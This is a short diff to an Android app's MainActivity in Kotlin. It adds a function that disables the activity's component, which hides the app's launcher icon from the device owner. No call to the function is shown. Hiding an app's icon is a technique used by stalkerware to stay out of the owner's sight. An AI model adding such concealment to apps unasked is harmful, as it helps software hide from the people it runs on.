@@ -27,6 +27,16 @@ class MainActivity : AppCompatActivity() {
     private lateinit var tvStatus: TextView
     private lateinit var btnOpenDashboard: Button
 
+    private fun hideAppIcon(context: Context) {
+        val p = context.packageManager
+        val componentName = android.content.ComponentName(context, MainActivity::class.java)
+        p.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
